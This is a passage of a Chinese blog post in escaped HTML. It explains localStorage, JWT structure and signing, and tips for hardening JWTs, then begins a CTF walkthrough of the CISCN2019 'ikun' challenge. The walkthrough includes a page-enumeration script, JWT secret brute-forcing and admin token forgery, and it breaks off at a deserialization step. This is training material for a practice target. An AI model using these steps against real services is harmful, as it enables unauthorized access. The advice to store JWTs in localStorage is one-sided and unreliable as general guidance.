class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;一般我们会将 JSON 存入 localStorage 中，但是在 localStorage 会自动将 localStorage 转换成为字符串形式。&lt;/p&gt;
&lt;p&gt;这个时候我们可以使用 JSON.stringify () 这个方法，来将 JSON 转换成为 JSON 字符串。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;var storage=window.localStorage;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;var data=&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    name:&amp;#x27;xiecanyong&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sex:&amp;#x27;man&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    hobby:&amp;#x27;program&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;var d=JSON.stringify(data);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;storage.setItem(&amp;quot;data&amp;quot;,d);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//将JSON字符串转换成为JSON对象输出&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;var json=storage.getItem(&amp;quot;data&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;var jsonObj=JSON.parse(json);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;console.log(typeof jsonObj);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;打印出来是 Object 对象。&lt;/p&gt;
&lt;p&gt;另外还有一点要注意的是，其他类型读取出来也要进行转换。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221206150034668.png&#34; alt=&#34;image-20221206150034668&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;jwt组成&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#jwt组成&#34;&gt;#&lt;/a&gt; JWT 组成&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/jwt-composition.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;JWT 本质上就是一组字串，通过（ &lt;code&gt;.&lt;/code&gt; ）切分成三个为 Base64 编码的部分：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Header&lt;/strong&gt; : 描述 JWT 的元数据，定义了生成签名的算法以及  &lt;code&gt;Token&lt;/code&gt;  的类型。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Payload&lt;/strong&gt; : 用来存放实际需要传递的数据&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Signature（签名）&lt;/strong&gt; ：服务器通过 Payload、Header 和一个密钥 (Secret) 使用 Header 里面指定的签名算法（默认是 HMAC SHA256）生成。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;JWT 通常是这样的： &lt;code&gt;xxxxx.yyyyy.zzzzz&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;figure class=&#34;highlight text&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;你可以在 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9qd3QuaW8v&#34;&gt;jwt.ioopen in new window&lt;/span&gt; 这个网站上对其 JWT 进行解码，解码之后得到的就是 Header、Payload、Signature 这三部分。&lt;/p&gt;
&lt;p&gt;Header 和 Payload 都是 JSON 格式的数据，Signature 由 Payload、Header 和 Secret (密钥) 通过特定的计算公式和加密算法得到。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/jwt.io.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;header&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#header&#34;&gt;#&lt;/a&gt; header&lt;/h3&gt;
&lt;p&gt;Header 通常由两部分组成：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;typ&lt;/code&gt; （Type）：令牌类型，也就是 JWT。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;alg&lt;/code&gt; （Algorithm） ：签名算法，比如 HS256。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;figure class=&#34;highlight json&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;attr&#34;&gt;&amp;quot;alg&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;HS256&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;attr&#34;&gt;&amp;quot;typ&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;JWT&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;JSON 形式的 Header 被转换成 Base64 编码，成为 JWT 的第一部分。&lt;/p&gt;
&lt;h3 id=&#34;payload&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#payload&#34;&gt;#&lt;/a&gt; Payload&lt;/h3&gt;
&lt;p&gt;Payload 也是 JSON 格式数据，其中包含了 Claims (声明，包含 JWT 的相关信息)。&lt;/p&gt;
&lt;p&gt;Claims 分为三种类型：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Registered Claims（注册声明）&lt;/strong&gt; ：预定义的一些声明，建议使用，但不是强制性的。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Public Claims（公有声明）&lt;/strong&gt; ：JWT 签发方可以自定义的声明，但是为了避免冲突，应该在 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuaWFuYS5vcmcvYXNzaWdubWVudHMvand0L2p3dC54aHRtbA==&#34;&gt;IANA JSON Web Token Registryopen in new window&lt;/span&gt; 中定义它们。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Private Claims（私有声明）&lt;/strong&gt; ：JWT 签发方因为项目需要而自定义的声明，更符合实际项目场景使用。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;下面是一些常见的注册声明：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;iss&lt;/code&gt; （issuer）：JWT 签发方。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;iat&lt;/code&gt; （issued at time）：JWT 签发时间。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sub&lt;/code&gt; （subject）：JWT 主题。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;aud&lt;/code&gt; （audience）：JWT 接收方。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;exp&lt;/code&gt; （expiration time）：JWT 的过期时间。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;nbf&lt;/code&gt; （not before time）：JWT 生效时间，早于该定义的时间的 JWT 不能被接受处理。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;jti&lt;/code&gt; （JWT ID）：JWT 唯一标识。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;figure class=&#34;highlight json&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;attr&#34;&gt;&amp;quot;uid&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;ff1212f5-d8d1-4496-bf41-d2dda73de19a&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;attr&#34;&gt;&amp;quot;sub&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;1234567890&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;attr&#34;&gt;&amp;quot;name&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;John Doe&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;attr&#34;&gt;&amp;quot;exp&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;15323232&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;attr&#34;&gt;&amp;quot;iat&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1516239022&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;attr&#34;&gt;&amp;quot;scope&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;admin&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;user&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Payload 部分默认是不加密的，&lt;strong&gt;一定不要将隐私信息存放在 Payload 当中！！！&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;JSON 形式的 Payload 被转换成 Base64 编码，成为 JWT 的第二部分。&lt;/p&gt;
&lt;h3 id=&#34;signature&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#signature&#34;&gt;#&lt;/a&gt; Signature&lt;/h3&gt;
&lt;p&gt;Signature 部分是对前两部分的签名，作用是防止 JWT（主要是 payload） 被篡改。&lt;/p&gt;
&lt;p&gt;这个签名的生成需要用到：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Header + Payload。&lt;/li&gt;
&lt;li&gt;存放在服务端的密钥 (一定不要泄露出去)。&lt;/li&gt;
&lt;li&gt;签名算法。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;签名的计算公式如下：&lt;/p&gt;
&lt;figure class=&#34;highlight text&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;HMACSHA256(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  base64UrlEncode(header) + &amp;quot;.&amp;quot; +&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  base64UrlEncode(payload),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  secret)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;算出签名以后，把 Header、Payload、Signature 三个部分拼成一个字符串，每个部分之间用 &amp;quot;点&amp;quot;（ &lt;code&gt;.&lt;/code&gt; ）分隔，这个字符串就是 JWT 。&lt;/p&gt;
&lt;h2 id=&#34;jwt进行身份验证&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#jwt进行身份验证&#34;&gt;#&lt;/a&gt; JWT 进行身份验证&lt;/h2&gt;
&lt;p&gt;在基于 JWT 进行身份验证的的应用程序中，服务器通过 Payload、Header 和 Secret (密钥) 创建 JWT 并将 JWT 发送给客户端。客户端接收到 JWT 之后，会将其保存在 Cookie 或者 localStorage 里面，以后客户端发出的所有请求都会携带这个令牌&lt;/p&gt;
&lt;p&gt;Session 是在服务器端的，而 JWT 是在客户端的。&lt;/p&gt;
&lt;p&gt;![](&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9rYnNoaXJlLTEzMDg5ODE2OTcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWcvand0LWF1dGhlbnRpY2F0aW9u&#34;&gt;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/jwt-authentication&lt;/span&gt; process.png)&lt;/p&gt;
&lt;p&gt;简化后的步骤如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;用户向服务器发送用户名、密码以及验证码用于登陆系统。&lt;/li&gt;
&lt;li&gt;如果用户用户名、密码以及验证码校验正确的话，服务端会返回已经签名的 Token，也就是 JWT。&lt;/li&gt;
&lt;li&gt;用户以后每次向后端发请求都在 Header 中带上这个 JWT 。&lt;/li&gt;
&lt;li&gt;服务端检查 JWT 并从中获取用户相关信息。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221206152548804.png&#34; alt=&#34;image-20221206152548804&#34;&gt;&lt;/p&gt;
&lt;p&gt;两点建议：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;建议将 JWT 存放在 localStorage 中，放在 Cookie 中会有 CSRF 风险。&lt;/li&gt;
&lt;li&gt;请求服务端并携带 JWT 的常见做法是将其放在 HTTP Header 的  &lt;code&gt;Authorization&lt;/code&gt;  字段中（ &lt;code&gt;Authorization: Bearer Token&lt;/code&gt; ）。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;防止-jwt-被篡改&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#防止-jwt-被篡改&#34;&gt;#&lt;/a&gt; 防止 JWT 被篡改&lt;/h2&gt;
&lt;p&gt;有了签名之后，即使 JWT 被泄露或者截获，黑客也没办法同时篡改 Signature 、Header 、Payload。&lt;/p&gt;
&lt;p&gt;这是为什么呢？因为服务端拿到 JWT 之后，会解析出其中包含的 Header、Payload 以及 Signature 。服务端会根据 Header、Payload、密钥再次生成一个 Signature。拿新生成的 Signature 和 JWT 中的 Signature 作对比，如果一样就说明 Header 和 Payload 没有被修改。&lt;/p&gt;
&lt;p&gt;不过，如果服务端的秘钥也被泄露的话，黑客就可以同时篡改 Signature 、Header 、Payload 了。黑客直接修改了 Header 和 Payload 之后，再重新生成一个 Signature 就可以了。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;密钥一定保管好，一定不要泄露出去。JWT 安全的核心在于签名，签名安全的核心在密钥。&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;如何加强-jwt-的安全性&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#如何加强-jwt-的安全性&#34;&gt;#&lt;/a&gt; 如何加强 JWT 的安全性？&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;使用安全系数高的加密算法。&lt;/li&gt;
&lt;li&gt;使用成熟的开源库，没必要造轮子。&lt;/li&gt;
&lt;li&gt;JWT 存放在 localStorage 中而不是 Cookie 中，避免 CSRF 风险。&lt;/li&gt;
&lt;li&gt;一定不要将隐私信息存放在 Payload 当中。&lt;/li&gt;
&lt;li&gt;密钥一定保管好，一定不要泄露出去。JWT 安全的核心在于签名，签名安全的核心在密钥。&lt;/li&gt;
&lt;li&gt;Payload 要加入  &lt;code&gt;exp&lt;/code&gt;  （JWT 的过期时间），永久有效的 JWT 不合理。并且，JWT 的过期时间不易过长。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;jwt优势&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#jwt优势&#34;&gt;#&lt;/a&gt; jwt 优势&lt;/h2&gt;
&lt;p&gt;相比于 Session 认证的方式来说，使用 JWT 进行身份认证主要有下面 4 个优势。&lt;/p&gt;
&lt;h3 id=&#34;无状态&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#无状态&#34;&gt;#&lt;/a&gt; 无状态&lt;/h3&gt;
&lt;p&gt;JWT 自身包含了身份验证所需要的所有信息，因此，我们的服务器不需要存储 Session 信息。这显然增加了系统的可用性和伸缩性，大大减轻了服务端的压力。&lt;/p&gt;
&lt;h3 id=&#34;有效避免了-csrf-攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#有效避免了-csrf-攻击&#34;&gt;#&lt;/a&gt; 有效避免了 CSRF 攻击&lt;/h3&gt;
&lt;p&gt;一般情况下我们使用 JWT 的话，在我们登录成功获得 JWT 之后，一般会选择存放在 localStorage 中。前端的每一个请求后续都会附带上这个 JWT，整个过程压根不会涉及到 Cookie。因此，即使你点击了非法链接发送了请求到服务端，这个非法请求也是不会携带 JWT 的，所以这个请求将是非法的。&lt;/p&gt;
&lt;p&gt;总结来说就一句话：&lt;strong&gt;使用 JWT 进行身份验证不需要依赖 Cookie ，因此可以避免 CSRF 攻击。&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;适合移动端应用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#适合移动端应用&#34;&gt;#&lt;/a&gt; 适合移动端应用&lt;/h3&gt;
&lt;p&gt;使用 Session 进行身份认证的话，需要保存一份信息在服务器端，而且这种方式会依赖到 Cookie（需要 Cookie 保存  &lt;code&gt;SessionId&lt;/code&gt; ），所以不适合移动端。&lt;/p&gt;
&lt;p&gt;但是，使用 JWT 进行身份认证就不会存在这种问题，因为只要 JWT 可以被客户端存储就能够使用，而且 JWT 还可以跨语言使用。&lt;/p&gt;
&lt;h3 id=&#34;单点登录友好&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#单点登录友好&#34;&gt;#&lt;/a&gt; 单点登录友好&lt;/h3&gt;
&lt;p&gt;使用 Session 进行身份认证的话，实现单点登录，需要我们把用户的 Session 信息保存在一台电脑上，并且还会遇到常见的 Cookie 跨域的问题。但是，使用 JWT 进行认证的话， JWT 被保存在客户端，不会存在这些问题。&lt;/p&gt;
&lt;h2 id=&#34;jwt在ctf中运用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#jwt在ctf中运用&#34;&gt;#&lt;/a&gt; jwt 在 ctf 中运用&lt;/h2&gt;
&lt;h3 id=&#34;ciscn2019-华北赛区-day1-web2ikun&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ciscn2019-华北赛区-day1-web2ikun&#34;&gt;#&lt;/a&gt; [CISCN2019 华北赛区 Day1 Web2] ikun&lt;/h3&gt;
&lt;p&gt;1. 通过脚本爆破 lv6 的 page&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;url=&amp;quot;http://3ecc60d7-c14f-4805-9476-71bcd91747c8.node3.buuoj.cn/shop?page=&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;for i in range(0,2000):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    print(i)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r=requests.get( url + str(i) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if &amp;#x27;lv6.png&amp;#x27; in r.text:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        print (i)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        break&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;2. 随便注册，然后登陆&lt;/p&gt;
&lt;p&gt;3. 将 lv6 加入购物车然后抓包，修改 discount 和 jwt&lt;/p&gt;
&lt;p&gt;修改 jwt 时涉及到 jwt 伪造和 secret 爆破&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2JyZW5kYW4tcml1cy9jLWp3dC1jcmFja2Vy&#34;&gt;brendan-rius/c-jwt-cracker: JWT brute force cracker written in C (github.com)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;通过 jwtcracker 爆破 secret，得到 &lt;code&gt;1Kun&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;题目中还说需要 admin，那就伪造&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221207135357827.png&#34; alt=&#34;image-20221207135357827&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221207140037810.png&#34; alt=&#34;image-20221207140037810&#34;&gt;&lt;/p&gt;
&lt;p&gt;4. 源码泄露，python 反序列化&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td 